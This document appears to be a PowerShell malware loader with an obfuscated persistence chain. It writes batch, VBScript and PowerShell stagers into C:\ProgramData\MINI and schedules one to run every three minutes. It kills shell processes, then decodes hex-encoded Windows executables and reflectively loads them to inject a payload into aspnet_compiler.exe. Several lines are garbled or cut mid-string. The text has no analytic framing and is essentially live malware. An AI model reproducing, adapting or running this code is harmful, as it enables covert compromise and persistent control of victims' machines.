$L1 = "C:\ProgramData\MINI"
New-Item $L1 -ItemType Directory -Force
start-sleep 2
$Content = @'
PowerShell -NoProfile -ExecutionPolicy Bypass -Command C:\ProgramData\MINI\GLB4.PS1
Set-Content -Path C:\ProgramData\MINI\NYDYDSBERDSVERY.bat -Value $Content
on error resume next
WScript.Sleep(1000)
set FBX = CreateObject("WScript.Shell")
FBX.run "C:\ProgramData\MINI\xx.bat",0
Set-Content -Path C:\ProgramData\MINI\xx.vbs -Value $Content
With CreateObject("WScript.Shell")
.Run "C:\ProgramData\MINI\NYDYDSBERDSVERY.bat", 0, True
End With
Set-Content -Path C:\ProgramData\MINI\NYDYDSBERDSVERY.vbs -Value $Content
schtasks.exe /create /tn App /sc minute /mo 3 /tr "C:\ProgramData\MINI\NYDYDSBERDSVERY.vbs"
taskkill /F /IM schtasks.exe /T
taskkill /F /IM powershell.exe /T
taskkill /F /IM cmd.exe /T
Set-Content -Path C:\ProgramData\MINI\xx.bat -Value $Content
Function Binary2String([String] $Yatak) {
$byteList = [System.Collections.Generic.List[Byte]]::new()
for ($i = 0
$i -lt $Yatak.Length
$i +=8) {
$byteList.Add([Convert]::ToByte($Yatak.Substring($i, 8), 2))
return [System.Text.Encoding]::ASCII.GetString($byteList.ToArray())
Function HexaToByte([String] $IN) {
$RNBX1 = $IN.Replace('@','0')
$bytes = New-Object -TypeName byte[] -ArgumentList ($RNBX1.Length / 2)
$i -lt $RNBX1.Length
$i += 2) {
$bytes[$i / 2] = [Convert]::ToByte($RNBX1.Substring($i, 2), 16)
return [byte[]]$bytes
start-sleep 3
$CLE11 = '4D5A9@@@@3@@@@@@@4@@@@@@FFFF@@@@B8@@@@@@@@@@@@@@4@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@8@@@@@@@@E1FBA@E@@B4@9CD21B8@14CCD21546869732@7@726F6772616D2@63616E6E6F742@62652@72756E2@696E2@444F532@6D6F64652E@D@D@A24@@@@@@@@@@@@@@5@45@@@@4C@1@3@@5D9@FE62@@@@@@@@@@@@@@@@E@@@@2@1@B@1@8@@@@C8@@@@@@@A@@@@@@@@@@@@@EE6@@@@@@2@@@@@@@@@@1@@@@@@4@@@@@2@@@@@@@@2@@@@@4@@@@@@@@@@@@@@@4@@@@@@@@@@@@@@@@4@@1@@@@@2@@@@@@@@@@@@@2@@4@85@@@@1@@@@@1@@@@@@@@@1@@@@@1@@@@@@@@@@@@@1@@@@@@@@@@@@@@@@@@@@@@@BCE5@@@@4F@@@@@@@@@@@1@@FF@7@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@2@@1@@@C@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@2@@@@@@8@@@@@@@@@@@@@@@@@@@@@@@82@@@@@48@@@@@@@@@@@@@@@@@@@@@@2E74657874@@@@@@14C6@@@@@@2@@@@@@@C8@@@@@@@2@@@@@@@@@@@@@@@@@@@@@@@@@@@@2@@@@@6@2E72737263@@@@@@FF@7@@@@@@@@@1@@@@@8@@@@@@CA@@@@@@@@@@@@@@@@@@@@@@@@@@@@4@@@@@4@2E72656C6F63@@@@@C@@@@@@@@2@@1@@@@@2@@@@@@D2@@@@@@@@@@@@@@@@@@@@@@@@@@@@4@@@@@42@@@@@@@@@@@@@@@@@@@@@@
$RNBX1 = '4D5A9@@@@3@@@@@@@4@@@@@@FFFF@@@@B8@@@@@@@@@@@@@@4@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@8@@@@@@@@E1FBA@E@@B4@9CD21B8@14CCD21546869732@7@726F6772616D2@63616E6E6F742@62652@72756E2@696E2@444F532@6D6F64652E@D@D@A24@@@@@@@@@@@@@@5@45@@@@4C@1@3@@F9ED56D9@@@@@@@@@@@@@@@@E@@@@E21@B@13@@@@@2C@1@@@@@6@@@@@@@@@@@@FE4A@1@@@@2@@@@@@@6@@1@@@@@@4@@@@@2@@@@@@@@2@@@@@4@@@@@@@@@@@@@@@6@@@@@@@@@@@@@@@@A@@1@@@@@2@@@@@@@@@@@@@3@@6@85@@@@1@@@@@1@@@@@@@@@1@@@@@1@@@@@@@@@@@@@1@@@@@@@@@@@@@@@@@@@@@@@B@4A@1@@4B@@@@@@@@6@@1@@44@3@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@8@@1@@@C@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@2@@@@@@8@@@@@@@@@@@@@@@@@@@@@@@82@@@@@48@@@@@@@@@@@@@@@@@@@@@@2E74657874@@@@@@@42B@1@@@@2@@@@@@@2C@1@@@@@2@@@@@@@@@@@@@@@@@@@@@@@@@@@@2@@@@@6@2E72737263@@@@@@44@3@@@@@@6@@1@@@@@4@@@@@@2E@1@@@@@@@@@@@@@@@@@@@@@@@@@@4@@@@@4@2E72656C6F63@@@@@C@@@@@@@@8@@1@@@@@2@@@@@@32@1@@@@@@@@@@@@@@@@@@@@@@@@@@4@@@@@42@@@@@@@@@@@@@@@@@@@@@@
[byte[]]$WULC4 = HexaToByte($CLE11)
[byte[]]$YIV4Z = HexaToByte($RNBX1)
$OKM4 = (Binary2String("
1".Replace('
','0')))
$x1ct = (Binary2String("0
".Replace('
','1')))
$Path = 'C:\Wi
ows\Mi
soft.NET\Frame
work\v4.0.30319\asp
net_com
ler.exe'
$ncr3 = [System.Reflection.Assembly]
$ncrx3 = $ncr3::Load(($YIV4Z))
} catch { }
try
$TXN4Z = $ncrx3.GetType('G'+ 'IT.local')
$MG5X = $TXN4Z.'GetMethod'($OKM4)
$MG5X.$x1ct($null,[object[]] ($Path.Replace("
",""),$WULC4))
Set-Content -Path C:\ProgramData\MINI\GLB4.PS1 -Value $Content
start-sleep 7
$FT2 = "C:\ProgramData\MINI\xx.vbs"
start $FT2